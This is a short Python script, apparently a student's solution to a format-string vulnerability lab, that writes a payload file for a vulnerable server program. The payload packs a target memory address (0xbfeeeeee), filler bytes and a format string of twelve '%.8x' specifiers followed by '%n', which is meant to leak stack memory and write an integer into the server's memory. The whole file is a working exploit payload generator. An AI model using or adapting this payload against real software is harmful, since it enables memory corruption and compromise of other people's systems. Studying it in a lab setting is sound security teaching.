# Using this python script to send an integer using the Fomatted String vulnerability and able to peek into memory of the servers program

#Importing all the rquired libraries
import sys

# Intializing the size of the array
N = 1000
# Creating an array of the above mentioend size
y = bytearray(0x0 for i in range(N))

# Representing the integer in a hexa decimal format
number  = 0xbfeeeeee
# Converting the hexdecimal to computer readabkle fornat
# Using only the first 4 bytes as expalined in the readme file
y[0:4]  =  (number).to_bytes(4,byteorder='little')
y[4:8]  =  ("abcd").encode('latin-1')

# Creating a string that will be send by the attacker to the servers code
s = "%.8x"*12 + "%n"
fmt  = (s).encode('latin-1')
y[8:8+len(fmt)] = fmt

# Updating the contents in a file which can be send all together
file = open("Check_file", "wb")
file.write(y)
file.close()
